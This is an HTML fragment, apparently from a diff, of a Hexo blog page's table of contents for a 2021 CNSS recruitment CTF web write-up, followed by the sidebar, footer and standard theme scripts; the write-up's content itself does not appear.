+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CNSS-Recruit-2021%E2%80%94%E2%80%94web-wp"><span class="nav-number">1.</span> <span class="nav-text">CNSS Recruit 2021——web_wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-To-be-admin"><span class="nav-number">1.1.</span> <span class="nav-text">1.To_be_admin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-To-be-admin-again"><span class="nav-number">1.2.</span> <span class="nav-text">2.To_be_admin_again</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Blackpage"><span class="nav-number">1.3.</span> <span class="nav-text">3.Blackpage</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Debuger"><span class="nav-number">1.4.</span> <span class="nav-text">4.Debuger</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-signin"><span class="nav-number">1.5.</span> <span class="nav-text">5.signin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%F0%9F%98%83Easy-%E6%9B%B4%E5%9D%91%E7%9A%84%E6%95%B0%E5%AD%A6%E9%A2%98"><span class="nav-number">1.6.</span> <span class="nav-text">6.[😃Easy]更坑的数学题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%F0%9F%98%83Easy-Ezp-p"><span class="nav-number">1.7.</span> <span class="nav-text">7.[😃Easy]Ezp#p</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%F0%9F%98%83Easy-China-Flag"><span class="nav-number">1.8.</span> <span class="nav-text">8.[😃Easy]China Flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-%F0%9F%98%AFMid-bestLanguage"><span class="nav-number">1.9.</span> <span class="nav-text">9.[😯Mid]bestLanguage</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%F0%9F%98%AEMid-To-be-Admin-Again-and-Again"><span class="nav-number">1.10.</span> <span class="nav-text">10.[😮Mid]To_be_Admin_Again_and_Again</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-%F0%9F%98%AEMid-%E5%A4%AA%E6%9E%81%E6%8E%8C%E9%97%A8%E4%BA%BA"><span class="nav-number">1.11.</span> <span class="nav-text">11.[😮Mid]太极掌门人</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-%F0%9F%A4%AFHard-To-be-Admin-Again-and-Again-and-Again"><span class="nav-number">1.12.</span> <span class="nav-text">12.[🤯Hard]To_be_Admin_Again_and_Again_and_Again</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">huhu</p>
+  <div class="site-description" itemprop="description">never give up</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+  
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">huhu</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+  
+	<script type="text/javascript"
+	color="0,0,255" opacity='0.7' zIndex="-2" count="199" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/schemes/clicklove.js"></script>
